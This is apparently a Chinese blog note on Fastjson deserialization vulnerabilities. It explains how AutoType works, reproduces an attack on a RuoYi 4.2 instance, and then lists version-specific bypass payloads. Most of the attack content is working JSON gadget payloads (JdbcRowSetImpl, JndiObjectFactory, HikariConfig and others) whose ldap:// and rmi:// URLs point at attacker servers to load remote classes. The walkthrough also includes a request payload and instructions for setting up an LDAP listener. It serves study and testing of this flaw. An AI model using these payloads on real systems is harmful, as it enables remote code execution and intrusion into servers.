---
title: FastJson
date: 2026-09-20 02:16:39
categories:
  - JavaCodeSecurity
  - 组件漏洞
tags:
  - FastJson
  - 反序列化
  - RCE
---

**fastjson原理：**
fastjson在对json字符串反序列化为java对象时，引入了autotype功能导致读取到@type的内容，将json内容反序列化为java对象并调用这个类的setter方法

**引入AutoType原因：**
fastjson在序列化以及反序列化的过程中并没有使用Java自带的序列化机制，而是自定义了一套机制。其实，对于JSON框架来说，想要把一个Java对象转换成字符串，可以有两种选择：
1.基于setter/getter
2.基于属性（AutoType）
基于setter/getter会带来什么问题呢，下面举个例子，假设有如下两个类：

```java
class Apple implement Fruit{
	private Big_Decimal price;
	//省略 setter/getter、toString等
}

class iphone implements Fruit{
	private Big_Decimal price;
	//省略 setter/getter、toString等
}
```

实例化对象之后，假设苹果对象的price为0.5，Apple类对象序列化为json格式后为：
{"Fruit":{"price":0.5}}
假设iphone对象的price为5000,序列化为json格式后为：
{"Fruit":{"price":5000}}
当一个类只有一个接口的时候，将这个类的对象序列化的时候，就会将子类抹去（apple/iphone）只保留接口的类型(Fruit)，最后导致反序列化时无法得到原始类型。

本例中，将两个json再反序列化生成java对象的时候，无法区分原始类是apple还是iphone。
为了解决上述问题： fastjson引入了基于属性（AutoType），即在序列化的时候，先把原始类型记录下来。使用@type的键记录原始类型，在本例中，引入AutoType后，Apple类对象序列化为json格式后为：
{ "fruit":{ "@type":"com.hollis.lab.fastjson.test.Apple", "price":0.5 } }
引入AutoType后，iphone类对象序列化为json格式后为：
{ "fruit":{ "@type":"com.hollis.lab.fastjson.test.iphone", "price":5000 } }

这样在反序列化的时候就可以区分原始的类了。

**反序列化漏洞的原理**
使用AutoType功能进行序列号的JSON字符会带有一个@type来标记其字符的原始类型，在反序列化的时候会读取这个@type，来试图把JSON内容反序列化到对象，并且会调用这个库的setter或者getter方法，然而，@type的类有可能被恶意构造，只需要合理构造一个JSON，使用@type指定一个想要的攻击类库就可以实现攻击。

```
@type： 这是一个 JSON 字段，它的作用是**告诉 Fastjson 解析器：请将这个 JSON 对象反序列化成后面指定的 Java 类的实例。它本身只是一个标记。
例如：`{"@type":"com.example.User", "name":"admin"}`的意思是：创建一个 `com.example.User`对象，并设置其 `name`属性为 `"admin"`。

AutoType： 这是 Fastjson 为了支持上述功能而实现的一个安全特性（后来成了漏洞之源）
核心作用： 控制是否允许根据 `@type`中指定的类名来加载任意的类。
 如果没有任何限制，攻击者可以轻松构造 `@type`指向任何恶意类（如 `JdbcRowSetImpl`, `TemplatesImpl`），从而触发危险操作（如 JNDI 注入、代码执行）。所以，Fastjson 引入了白名单和黑名单机制来限制哪些类可以通过 `@type`被实例化

```bash

常见的有sun官方提供的一个类com.sun.rowset.JdbcRowSetImpl，其中有个dataSourceName方法支持传入一个rmi的源，只要解析其中的url就会支持远程调用！因此整个漏洞复现的原理过程就是：
1.攻击者（我们）访问存在fastjson漏洞的目标靶机网站，通过burpsuite抓包改包，以json格式添加com.sun.rowset.JdbcRowSetImpl恶意类信息发送给目标机。
2.存在漏洞的靶机对json反序列化时候，会加载执行我们构造的恶意信息(访问rmi服务器)，靶机服务器就会向rmi服务器请求待执行的命令。
3.rmi 服务器请求加载远程机器的class（这个远程机器是我们搭建好的恶意站点，提前将漏洞利用的代码编译得到.class文件，并上传至恶意站点），得到攻击者（我们）构造好的命令（ping dnslog或者创建文件或者反弹shell啥的）

**漏洞代码审计分析**

**漏洞利用**
Jdbc链
cc链

RuoYi4.2的FastJson1.2.60复现
通过一些列审计等手段，定位到这里
> 图片缺失：Pasted image 20251207190041.png （原文件未随笔记一起复制，请补充后删除本行提示）
主要的是这里1.2.60会默认禁用autotype，这里方便先进行去除autotype，在运行的时候使用这个就可以了
 java -Dfastjson.parser.autoTypeSupport=true -jar ruoyi-admin.jar

然后就是进行查看
这个jndi的链就可以

需要在攻击服务器上搭建ldap服务，并且进行监听
> 图片缺失：Pasted image 20251207190239.png （原文件未随笔记一起复制，请补充后删除本行提示）
> 图片缺失：Pasted image 20251207190214.png （原文件未随笔记一起复制，请补充后删除本行提示）
> 图片缺失：Pasted image 20251207190226.png （原文件未随笔记一起复制，请补充后删除本行提示）
> 图片缺失：Pasted image 20251207190259.png （原文件未随笔记一起复制，请补充后删除本行提示）
&params[@type]=org.apache.shiro.jndi.JndiObjectFactory&params[resourceName]=ldap://192.168.31.94:1389/#Exploit

要加这个#，要不然不执行

# FastJson代码分析

# FastJson绕过
fastjson各个版本的规则不同，但是基本上想要利用都需要支持autotype，除了1.2.40左右可以通过双重的一个反序列化，实现不需要autotype

fastjson 1.2.5 <= 1.2.59
需要开启AutoType设置

```
{"@type":"com.zaxxer.hikari.HikariConfig","metricRegistry":"ldap://localhost:1389/Exploit"}
```

Fastjson1.2.5 <= 1.2.60
需要开启 autoType：

```
{"@type":"oracle.jdbc.connector.OracleManagedConnectionFactory","xaDataSourceName":"rmi://10.10.20.166:1099/ExportObject"}

{"@type":"org.apache.commons.configuration.JNDIConfiguration","prefix":"ldap://10.10.20.166:1389/ExportObject"}
```

Fastjson1.2.5 <= 1.2.61

```
{"@type":"org.apache.commons.proxy.provider.remoting.SessionBeanProvider","jndiName":"ldap://localhost:1389/Exploit"}
```

fastjson=1.2.62
需要开启AutoType

```
{"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"rmi://127.0.0.1:1099/exploit"}";
```

fastjson = 1.2.66
需要autotype true

```java
{"@type":"org.apache.shiro.jndi.JndiObjectFactory",
	"resourceName":"ldap://192.168.80.1:1389/Calc"
}

{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","metricRegistry":"ldap://192.168.80.1:1389/Calc"}

{"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup","jndiNames":"ldap://192.168.80.1:1389/Calc"}

{"@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig",
"properties":{
	"@type":"java.util.Properties",
	"UserTransaction":"ldap://192.168.80.1:1389/Calc"
	}
}

```
